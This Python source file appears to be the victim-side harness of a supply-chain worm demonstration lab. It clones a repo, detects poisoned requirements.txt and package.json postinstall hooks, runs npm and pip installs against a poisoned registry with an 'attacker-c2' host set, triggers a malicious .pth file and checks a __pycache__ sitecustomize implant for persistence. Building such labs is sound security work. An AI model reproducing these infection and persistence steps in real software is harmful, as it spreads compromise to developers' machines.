"""Victim-2 container -- developer workstation with git watcher.

Clones the internal-app repo on startup, polls for changes, and
auto-installs requirements.txt when it changes. This is how the
worm from victim-1 propagates.
"""
from __future__ import annotations

import asyncio
import json
import os
import shutil
import subprocess
import sys
import threading
import time
from urllib.request import Request, urlopen

from fastapi import FastAPI

app = FastAPI()

DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "http://dashboard:8000")
GIT_SERVER = os.environ.get("GIT_SERVER", "git-server")
GIT_REPO_PATH = os.environ.get("GIT_REPO_PATH", "/repos/internal-app.git")
REGISTRY_URL = os.environ.get("REGISTRY_URL", "http://registry:8080/simple/")
POLL_INTERVAL = int(os.environ.get("GIT_POLL_INTERVAL", "5"))
SOURCE = "victim-2"

CLONE_DIR = "/tmp/internal-app"
WATCHER_STATE = {"status": "waiting", "last_commit": None, "infected": False}

SSH_KEY = os.path.expanduser("~/.ssh/id_ed25519")
GIT_SSH_CMD = f"ssh -i {SSH_KEY} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

SITE_PKG = None


def _get_site_packages():
    global SITE_PKG
    if SITE_PKG is None:
        SITE_PKG = subprocess.run(
            [sys.executable, "-c", "import site; print(site.getsitepackages()[0])"],
            capture_output=True, text=True,
            env={**os.environ, "_PTH_GUARD": "1"},
        ).stdout.strip()
    return SITE_PKG


def _report(event_type, data=None):
    payload = json.dumps({
        "type": event_type,
        "data": data or {},
        "timestamp": time.time(),
        "source": SOURCE,
    }).encode()
    req = Request(
        f"{DASHBOARD_URL}/api/events",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urlopen(req, timeout=3)
    except Exception:
        pass


def _git_env():
    return {**os.environ, "GIT_SSH_COMMAND": GIT_SSH_CMD}


def _clone_repo():
    """Clone the internal-app repo. Retries until git-server is ready."""
    clone_url = f"git@{GIT_SERVER}:{GIT_REPO_PATH}"
    for attempt in range(120):
        if os.path.exists(CLONE_DIR):
            shutil.rmtree(CLONE_DIR)
        result = subprocess.run(
            ["git", "clone", clone_url, CLONE_DIR],
            capture_output=True, text=True, env=_git_env(), timeout=15,
        )
        if result.returncode == 0:
            _report("v2_repo_cloned", {"repo": clone_url})
            head = subprocess.run(
                ["git", "rev-parse", "--short", "HEAD"],
                cwd=CLONE_DIR, capture_output=True, text=True, env=_git_env(),
            ).stdout.strip()
            WATCHER_STATE["last_commit"] = head
            WATCHER_STATE["status"] = "watching"
            return True
        time.sleep(2)
    _report("v2_clone_failed", {"error": "Exhausted retries"})
    return False


def _check_for_updates():
    """Pull latest and check if poisoned files changed."""
    env = _git_env()
    subprocess.run(["git", "fetch", "origin"], cwd=CLONE_DIR,
                   capture_output=True, env=env, timeout=15)
    head_local = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=CLONE_DIR,
        capture_output=True, text=True, env=env,
    ).stdout.strip()
    head_remote = subprocess.run(
        ["git", "rev-parse", "origin/main"], cwd=CLONE_DIR,
        capture_output=True, text=True, env=env,
    ).stdout.strip()

    if head_local == head_remote:
        return False

    _report("v2_new_commits", {"local": head_local[:7], "remote": head_remote[:7]})
    subprocess.run(["git", "pull", "origin", "main"], cwd=CLONE_DIR,
                   capture_output=True, env=env, timeout=15)
    WATCHER_STATE["last_commit"] = head_remote[:7]

    req_file = os.path.join(CLONE_DIR, "requirements.txt")
    pkg_file = os.path.join(CLONE_DIR, "package.json")
    poisoned = False
    if os.path.exists(req_file):
        with open(req_file) as f:
            contents = f.read()
        if "pyautoconf" in contents:
            _report("v2_poisoned_requirements", {"contents": contents})
            poisoned = True
    if os.path.exists(pkg_file):
        with open(pkg_file) as f:
            pkg = f.read()
        if '"postinstall": "node scripts/postinstall.js"' in pkg:
            _report("v2_polyglot_seed_detected", {"file": "package.json"})
            poisoned = True
    return poisoned


def _run_polyglot_install():
    pkg_file = os.path.join(CLONE_DIR, "package.json")
    if not os.path.exists(pkg_file):
        return

    _report("v2_polyglot_installing", {"message": "npm install (postinstall enabled)"})
    proc = subprocess.run(
        ["npm", "install", "--no-audit", "--no-fund"],
        cwd=CLONE_DIR,
        capture_output=True,
        text=True,
        timeout=120,
        env={**os.environ, "POLYGLOT_C2_HOST": "attacker-c2"},
    )
    _report("v2_polyglot_complete", {
        "returncode": proc.returncode,
        "stdout": proc.stdout[:500],
        "stderr": proc.stderr[:300],
    })


def _install_and_trigger():
    """Install pyautoconf from the poisoned registry, triggering the .pth payload."""
    _run_polyglot_install()
    _report("v2_installing", {"message": "pip install pyautoconf from local registry"})

    guarded_env = {**os.environ, "_PTH_GUARD": "1"}

    result = subprocess.run(
        [sys.executable, "-m", "pip", "install",
         "--index-url", REGISTRY_URL,
         "--trusted-host", "registry",
         "--no-deps",
         "pyautoconf"],
        capture_output=True, text=True, timeout=120, env=guarded_env,
    )
    _report("v2_pip_complete", {"stdout": result.stdout[:500], "returncode": result.returncode})

    if result.returncode != 0:
        _report("v2_pip_error", {"stderr": result.stderr[:500]})
        return

    import glob as _glob
    site_pkg = _get_site_packages()
    for pth in _glob.glob(os.path.join(sys.prefix, "pathogen_hook.pth")):
        dest = os.path.join(site_pkg, os.path.basename(pth))
        shutil.move(pth, dest)
        _report("v2_pth_moved", {"from": pth, "to": dest})

    _report("v2_triggering", {"message": "Triggering .pth via python invocation"})

    clean_env = {k: v for k, v in os.environ.items() if k != "_PTH_GUARD"}
    clean_env["PAYLOAD_SOURCE"] = SOURCE

    proc = subprocess.Popen(
        [sys.executable, "-c", "print('victim-2 triggered')"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        env=clean_env,
    )

    time.sleep(1)
    pth_path = os.path.join(site_pkg, "pathogen_hook.pth")
    if os.path.exists(pth_path):
        os.remove(pth_path)

    proc.communicate(timeout=120)

    # Persistence verification: execute the __pycache__ implant to prove it survives
    _report("v2_pycache_verify", {"message": "Verifying __pycache__ implant persistence"})
    time.sleep(1)
    pyc_path = os.path.expanduser(
        f"~/.cache/pathogen/__pycache__/sitecustomize.cpython-"
        f"{sys.version_info.major}{sys.version_info.minor}.pyc"
    )
    if os.path.exists(pyc_path):
        verify_proc = subprocess.run(
            [sys.executable, "-c",
             "import importlib.util, sys; "
             f"spec = importlib.util.spec_from_file_location('sitecustomize', '{pyc_path}'); "
             "mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)"],
            capture_output=True, text=True, timeout=10,
            env={**os.environ, "_PTH_GUARD": "1"},
        )
        _report("v2_pycache_triggered", {
            "path": pyc_path,
            "success": verify_proc.returncode == 0,
        })
    else:
        _report("v2_pycache_not_found", {"path": pyc_path})

    WATCHER_STATE["infected"] = True
    WATCHER_STATE["status"] = "infected"
    _report("v2_infection_complete", {"message": "victim-2 fully compromised via git worm"})


def _watcher_loop():
    """Main polling loop -- runs in a background thread."""
    _report("v2_watcher_started", {"message": "Git watcher starting"})

    if not _clone_repo():
        WATCHER_STATE["status"] = "error"
        return

    while not WATCHER_STATE["infected"]:
        time.sleep(POLL_INTERVAL)
        try:
            if _check_for_updates():
                _install_and_trigger()
                break
        except Exception as e:
            _report("v2_watcher_error", {"error": str(e)})


_watcher_thread = None


@app.on_event("startup")
async def startup():
    global _watcher_thread
    _watcher_thread = threading.Thread(target=_watcher_loop, daemon=True)
    _watcher_thread.start()


@app.get("/health")
async def health():
    return {"status": "ok", "watcher": WATCHER_STATE}


@app.get("/status")
async def status():
    return WATCHER_STATE
